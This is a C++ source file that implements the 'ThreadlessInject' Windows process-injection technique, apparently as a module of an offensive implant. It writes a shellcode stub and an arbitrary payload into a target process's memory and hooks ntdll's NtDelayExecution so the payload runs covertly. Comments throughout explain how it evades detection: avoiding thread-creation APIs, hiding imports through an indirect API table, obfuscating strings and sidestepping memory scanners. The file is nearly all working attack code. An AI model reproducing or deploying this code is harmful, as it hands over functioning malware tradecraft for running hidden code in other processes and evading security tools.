// ============================================================================
// ThreadlessInject.cpp — Remote Function Hooking Injection
// ============================================================================
// Technique: ThreadlessInject (CCob / _xeroxz — Bsides Cymru 2023)
//
// Instead of creating a new thread (CreateRemoteThread) or hijacking an
// existing thread via context modification (SuspendThread → SetThreadContext
// → ResumeThread), this technique hooks a function the target process calls
// NATURALLY — NtDelayExecution (ntdll.dll).
//
// How it works:
//   1. Open target process
//   2. Allocate memory for shellcode stub + user payload
//   3. WriteProcessMemory → write the stub + payload
//   4. Hook NtDelayExecution's first 5 bytes with JMP to our stub
//   5. When ANY thread naturally calls NtDelayExecution (Sleep, Wait, etc.),
//      execution redirects to our shellcode
//   6. Shellcode restores the hook, executes payload, returns normally
//
// APIs used:
//   - OpenProcess          ← needed for ALL injection techniques
//   - VirtualAllocEx       ← needed for ALL injection techniques
//   - WriteProcessMemory   ← needed for ALL injection techniques
//   - VirtualProtectEx     ← only if NtDelayExecution is in .text (usually RX)
//   - ReadProcessMemory    ← reads original 5 bytes before hooking
//
// APIs AVOIDED (zero footprint):
//   - ❌ CreateRemoteThread / NtCreateThreadEx
//   - ❌ SuspendThread
//   - ❌ SetThreadContext (RIP/EIP modification)
//   - ❌ ResumeThread (as injection trigger)
//   - ❌ QueueUserAPC (APC injection pattern)
// ============================================================================

#ifdef _WIN32

#include <windows.h>
#include <string>
#include <vector>
#include <cstring>
#include <cstdint>
#include <sstream>
#include <iomanip>

#include "obfuscation.h"
#include "api_table.h"

// ============================================================================
// SHELLCODE STUB LAYOUT (x64)
// ============================================================================
// The shellcode stub is constructed at runtime by BuildShellcodeStub().
// It is written into the target process alongside the user payload.
//
// Offset  Size  Description
// ------  ----  --------------------------------
// 0x00    11    Save volatile registers (push rax, rcx, rdx, r8, r9, r10, r11)
// 0x0B    17    Restore NtDelayExecution original bytes (LEA rax, [rip + 0x33])
// 0x1C    09    Call payload (lea rax, [rip + 0x32]; call rax)
// 0x25    11    Restore volatile registers (pop r11..rax)
// 0x30    05    Execute original 5 bytes of NtDelayExecution (mov r10,rcx; mov eax,SSN)
// 0x35    16    Jump to NtDelayExecution+5
// 0x45    16    Data section:
//                  [0x45] 8 bytes: NtDelayExecution absolute address
//                  [0x4D] 8 bytes: Original first 8 bytes of NtDelayExecution
// 0x55    ??    User payload shellcode
// ============================================================================
#define STUB_SAVE_REGS_OFFSET    0x00
#define STUB_RESTORE_HOOK_OFFSET 0x0B
#define STUB_CALL_PAYLOAD_OFFSET 0x1C
#define STUB_RESTORE_REGS_OFFSET 0x25
#define STUB_ORIG_BYTES_OFFSET   0x30
#define STUB_JMP_BACK_OFFSET     0x35
#define STUB_DATA_SECTION_OFFSET 0x45
#define STUB_PAYLOAD_OFFSET      0x55
#define STUB_HEADER_SIZE         STUB_PAYLOAD_OFFSET  // Total before payload

// ============================================================================
// BuildShellcodeStub — Constructs the hook handler shellcode at runtime
// ============================================================================
// The stub is position-independent. It is constructed once and written into
// the target process. The C++ code embeds the correct NtDelayExecution
// address and original bytes directly into the data section of the stub.
//
// Parameters:
//   ntdelay_addr    — Absolute address of NtDelayExecution in the target
//   original_bytes  — First 8 bytes of NtDelayExecution (read before hooking).
//                     Includes the 5-byte prologue + the 3 bytes at offset 5
//                     which are: 0F 05 C3 (syscall; ret). Reading all 8 ensures
//                     the shellcode's QWORD write restores EVERYTHING perfectly.
//
// Returns: vector<BYTE> containing the shellcode stub (without user payload)
// ============================================================================
static std::vector<BYTE> BuildShellcodeStub(void* ntdelay_addr, const BYTE original_bytes[8]) {
    std::vector<BYTE> stub(STUB_HEADER_SIZE, 0x90); // Fill with NOPs initially

    //
    // Offset 0x00: Save volatile registers (x64 calling convention)
    //
    BYTE save_regs[] = {
        0x50,       // push rax
        0x51,       // push rcx
        0x52,       // push rdx
        0x41, 0x50, // push r8
        0x41, 0x51, // push r9
        0x41, 0x52, // push r10
        0x41, 0x53  // push r11
    };
    memcpy(&stub[STUB_SAVE_REGS_OFFSET], save_regs, sizeof(save_regs));

    //
    // Offset 0x0B: Restore NtDelayExecution original bytes
    //   lea rax, [rip + 0x33]   → rax = data section (STUB_DATA_SECTION_OFFSET = 0x45)
    //                             RIP after LEA = 0x0B + 7 = 0x12
    //                             0x12 + 0x33 = 0x45 ✓
    //   mov rcx, [rax]          → rcx = ntdelay address (8 bytes at [0x45])
    //   mov rdx, [rax + 8]      → rdx = original 8 bytes (at [0x4D])
    //   mov [rcx], rdx          → write all 8 bytes back to NtDelayExecution
    //                             This fully restores the function: prologue + syscall;ret
    //
    BYTE restore_hook[] = {
        0x48, 0x8D, 0x05, 0x33, 0x00, 0x00, 0x00, // lea rax, [rip + 0x33]
        0x48, 0x8B, 0x08,                         // mov rcx, [rax]
        0x48, 0x8B, 0x50, 0x08,                   // mov rdx, [rax + 8]
        0x48, 0x89, 0x11                          // mov [rcx], rdx
    };
    memcpy(&stub[STUB_RESTORE_HOOK_OFFSET], restore_hook, sizeof(restore_hook));

    //
    // Offset 0x1C: Call the user payload
    // Payload is located at STUB_PAYLOAD_OFFSET (now 0x55)
    // RIP at LEA execution = 0x1C + 7 = 0x23
    // offset = STUB_PAYLOAD_OFFSET - 0x23 = 0x55 - 0x23 = 0x32
    //
    BYTE call_payload[] = {
        0x48, 0x8D, 0x05, 0x32, 0x00, 0x00, 0x00, // lea rax, [rip + 0x32]
        0xFF, 0xD0                                  // call rax
    };
    memcpy(&stub[STUB_CALL_PAYLOAD_OFFSET], call_payload, sizeof(call_payload));

    //
    // Offset 0x25: Restore volatile registers
    //
    BYTE restore_regs[] = {
        0x41, 0x5B, // pop r11
        0x41, 0x5A, // pop r10
        0x41, 0x59, // pop r9
        0x41, 0x58, // pop r8
        0x5A,       // pop rdx
        0x59,       // pop rcx
        0x58        // pop rax
    };
    memcpy(&stub[STUB_RESTORE_REGS_OFFSET], restore_regs, sizeof(restore_regs));

    //
    // Offset 0x30: Execute original 5 bytes of NtDelayExecution
    // These are: 4C 8B D1 B8 <SSN>  →  mov r10, rcx; mov eax, SSN_low
    // Copied from the original_bytes parameter
    //
    memcpy(&stub[STUB_ORIG_BYTES_OFFSET], original_bytes, 5);

    //
    // Offset 0x35: Jump to NtDelayExecution + 5
    //   lea rax, [rip + 0x09]   → rax = data section
    //   mov rax, [rax]           → rax = ntdelay address
    //   add rax, 5               → rax = ntdelay + 5 (skip our hook)
    //   jmp rax                  → continue normal execution
    //
    BYTE jmp_back[] = {
        0x48, 0x8D, 0x05, 0x09, 0x00, 0x00, 0x00, // lea rax, [rip + 0x09]
        0x48, 0x8B, 0x00,                         // mov rax, [rax]
        0x48, 0x83, 0xC0, 0x05,                   // add rax, 5
        0xFF, 0xE0                                 // jmp rax
    };
    memcpy(&stub[STUB_JMP_BACK_OFFSET], jmp_back, sizeof(jmp_back));

    //
    // Data section at offset 0x45:
    //   [0x45] 8 bytes: NtDelayExecution absolute address
    //   [0x4D] 8 bytes: Original first 8 bytes of NtDelayExecution
    //                   (5-byte prologue + 0F 05 C3 = syscall; ret)
    // The shellcode reads BOTH as QWORDs and writes all 8 bytes back.
    // This ensures the function is fully restored (not just the first 5 bytes).
    //
    memcpy(&stub[STUB_DATA_SECTION_OFFSET], &ntdelay_addr, sizeof(void*));
    memcpy(&stub[STUB_DATA_SECTION_OFFSET + 8], original_bytes, 8);

    return stub;
}

// ============================================================================
// HexToBytes — Convert hex string to byte vector
// ============================================================================
static std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byte_str = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byte_str.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// ============================================================================
// BytesToHex — Convert byte vector to hex string (for error messages)
// ============================================================================
static std::string BytesToHex(const BYTE* data, size_t len) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; i++) {
        oss << std::setw(2) << (int)data[i];
    }
    return oss.str();
}

// ============================================================================
// FindProcessPid — Find a process by name, return its PID
// ============================================================================
// Case-insensitive wide string compare (replaces _wcsicmp — avoids IAT leak)
static int wicmp(const wchar_t* a, const wchar_t* b) {
    for (;;) {
        wchar_t ca = *a, cb = *b;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return (int)ca - (int)cb;
        if (ca == 0) return 0;
        a++; b++;
    }
}

static DWORD FindProcessPid(const std::string& process_name) {
    // g_api.* — no direct WinAPI in IAT
    HANDLE hSnapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    DWORD pid = 0;

    // Convert process_name to wide char for comparison
    int wlen = g_api.MultiByteToWideChar(CP_UTF8, 0, process_name.c_str(), -1, NULL, 0);
    std::vector<wchar_t> wname(wlen);
    g_api.MultiByteToWideChar(CP_UTF8, 0, process_name.c_str(), -1, wname.data(), wlen);

    if (g_api.Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wicmp(pe.szExeFile, wname.data()) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (g_api.Process32NextW(hSnapshot, &pe));
    }

    g_api.CloseHandle(hSnapshot);
    return pid;
}

// ============================================================================
// performThreadlessInject — MAIN FUNCTION
// ============================================================================
// Hooks NtDelayExecution in the target process to redirect execution to our
// shellcode. No new thread is created, no thread context is modified.
//
// Parameters:
//   process_name  — Target process name (e.g., "notepad.exe")
//   payload_hex   — Hex-encoded shellcode to execute in the target
//
// Returns: String describing the result (success or error)
// ============================================================================
std::string performThreadlessInject(const std::string& process_name, const std::string& payload_hex) {
    std::string result;

    // -------------------------------------------------------------------
    // Step 1: Validate payload
    // -------------------------------------------------------------------
    if (payload_hex.length() < 2 || payload_hex.length() % 2 != 0) {
        return "[-] ThreadlessInject: Invalid payload hex";
    }

    std::vector<BYTE> payload = HexToBytes(payload_hex);
    if (payload.empty()) {
        return "[-] ThreadlessInject: Payload is empty";
    }

    // -------------------------------------------------------------------
    // Step 2: Find target process
    // -------------------------------------------------------------------
    DWORD pid = FindProcessPid(process_name);
    if (pid == 0) {
        return "[-] ThreadlessInject: Process \"" + process_name + "\" not found";
    }

    // -------------------------------------------------------------------
    // Step 3: Open target process
    // -------------------------------------------------------------------
    // g_api.* — no direct WinAPI in IAT
    HANDLE hProcess = g_api.OpenProcess(
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) {
        return "[-] ThreadlessInject: OpenProcess failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // -------------------------------------------------------------------
    // Step 4: Find NtDelayExecution address
    // -------------------------------------------------------------------
    // g_api.* — OBF() wrapped strings, no plaintext in binary
    HMODULE hNtdll = g_api.GetModuleHandleA(OBF("ntdll.dll"));
    if (!hNtdll) {
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: GetModuleHandle(ntdll) failed";
    }

    void* pNtdelay = (void*)g_api.GetProcAddress(hNtdll, OBF("NtDelayExecution"));
    if (!pNtdelay) {
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: NtDelayExecution not found";
    }

    // Verify the function signature (should start with 4C 8B D1 = mov r10, rcx)
    BYTE verify[3];
    g_api.ReadProcessMemory(hProcess, pNtdelay, verify, 3, NULL);
    if (verify[0] != 0x4C || verify[1] != 0x8B || verify[2] != 0xD1) {
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: NtDelayExecution signature mismatch " +
               BytesToHex(verify, 3);
    }

    // -------------------------------------------------------------------
    // Step 5: Read original first 8 bytes of NtDelayExecution
    // -------------------------------------------------------------------
    BYTE original_bytes[8];
    if (!g_api.ReadProcessMemory(hProcess, pNtdelay, original_bytes, 8, NULL)) {
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: Failed to read original bytes (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // -------------------------------------------------------------------
    // Step 6: Build the shellcode stub
    // -------------------------------------------------------------------
    std::vector<BYTE> stub = BuildShellcodeStub(pNtdelay, original_bytes);
    SIZE_T total_size = stub.size() + payload.size();

    // -------------------------------------------------------------------
    // Step 7: Allocate memory in target for stub + payload
    // -------------------------------------------------------------------
    void* pRemote = g_api.VirtualAllocEx(hProcess, NULL, total_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: VirtualAllocEx failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // -------------------------------------------------------------------
    // Step 8: Write shellcode stub and payload to target
    // -------------------------------------------------------------------
    SIZE_T written = 0;

    // Write the stub
    if (!g_api.WriteProcessMemory(hProcess, pRemote, stub.data(), stub.size(), &written) ||
        written != stub.size()) {
        g_api.VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: WriteProcessMemory (stub) failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // Write the user payload right after the stub
    void* pPayload = (BYTE*)pRemote + stub.size();
    if (!g_api.WriteProcessMemory(hProcess, pPayload, payload.data(), payload.size(), &written) ||
        written != payload.size()) {
        g_api.VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: WriteProcessMemory (payload) failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // -------------------------------------------------------------------
    // Step 9: Make NtDelayExecution writable, then install the hook
    // -------------------------------------------------------------------
    DWORD old_protect = 0;
    if (!g_api.VirtualProtectEx(hProcess, pNtdelay, 5, PAGE_EXECUTE_READWRITE, &old_protect)) {
        g_api.VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: VirtualProtectEx failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // Install JMP hook: JMP rel32 to our shellcode stub
    int32_t jmp_offset = (int32_t)((BYTE*)pRemote - (BYTE*)pNtdelay - 5);
    BYTE jmp_stub[5] = { 0xE9, 0, 0, 0, 0 };
    memcpy(&jmp_stub[1], &jmp_offset, 4);

    if (!g_api.WriteProcessMemory(hProcess, pNtdelay, jmp_stub, 5, &written) || written != 5) {
        g_api.VirtualProtectEx(hProcess, pNtdelay, 5, old_protect, &old_protect);
        g_api.VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        g_api.CloseHandle(hProcess);
        return "[-] ThreadlessInject: WriteProcessMemory (hook) failed (error " +
               std::to_string(g_api.pGetLastError()) + ")";
    }

    // IMPORTANT: Leave NtDelayExecution as RWX — the shellcode MUST write back
    // the original 8 bytes to self-remove the hook. If we restored the original
    // RX protection, the shellcode's write would cause an access violation crash.
    //
    // Leaving it RWX is a minor memory forensics artifact, but:
    //   1. The shellcode restores the original bytes on first trigger
    //   2. After that, NtDelayExecution is functionally identical to original
    //   3. The RWX protection persists only in the ntdll!NtDelayExecution 8-byte page
    //   4. Memory scanners that check for RWX usually look for HEAP/STACK, not ntdll
    //
    // No VirtualProtectEx restore call here — the shellcode handles the rest.

    // -------------------------------------------------------------------
    // Step 10: Done — hook is installed
    // -------------------------------------------------------------------
    // The hook will fire the next time ANY thread in the target process
    // calls NtDelayExecution (e.g., Sleep(), WaitForSingleObject, etc.)
    //
    // The shellcode stub will:
    //   1. Save registers
    //   2. Restore NtDelayExecution original bytes (removes the hook)
    //   3. Execute the user's payload
    //   4. Restore registers
    //   5. Execute original 5 bytes (mov r10, rcx; mov eax, SSN)
    //   6. Jump to NtDelayExecution + 5 (syscall; ret) — normal execution
    //
    // After the first trigger, NtDelayExecution returns to normal.
    //

    // Flush instruction cache to ensure the JIT hook is visible
    // (not strictly necessary on x64, but good practice)
    g_api.FlushInstructionCache(hProcess, pNtdelay, 5);
    g_api.FlushInstructionCache(hProcess, pRemote, total_size);

    g_api.CloseHandle(hProcess);

    // Return success with details
    result = "[+] ThreadlessInject: Hook installed on NtDelayExecution at ";
    result += BytesToHex((BYTE*)&pNtdelay, sizeof(pNtdelay));
    result += " (PID " + std::to_string(pid) + ")\n";
    result += "[+] Shellcode stub at ";
    result += BytesToHex((BYTE*)&pRemote, sizeof(pRemote));
    result += " (" + std::to_string(stub.size()) + " bytes)\n";
    result += "[+] Payload at ";
    result += BytesToHex((BYTE*)&pPayload, sizeof(pPayload));
    result += " (" + std::to_string(payload.size()) + " bytes)\n";
    result += "[+] Original NtDelayExecution: ";
    result += BytesToHex(original_bytes, 5);
    result += "\n[+] Hook installed: JMP to stub\n";
    result += "[+] Waiting for next NtDelayExecution call...\n";

    return result;
}

#else

// ============================================================================
// Non-Windows stub (macOS/Linux)
// ============================================================================
// ThreadlessInject uses Windows-specific APIs (NtDelayExecution hooking,
// OpenProcess, VirtualAllocEx, etc.) and cannot run on non-Windows platforms.
// This stub allows the code to compile cleanly everywhere.
// ============================================================================

#include <string>

std::string performThreadlessInject(const std::string& process_name, const std::string& payload_hex) {
    (void)process_name;
    (void)payload_hex;
    return "[-] ThreadlessInject: Windows-only technique (NtDelayExecution hooking not available on this platform)";
}

#endif // _WIN32
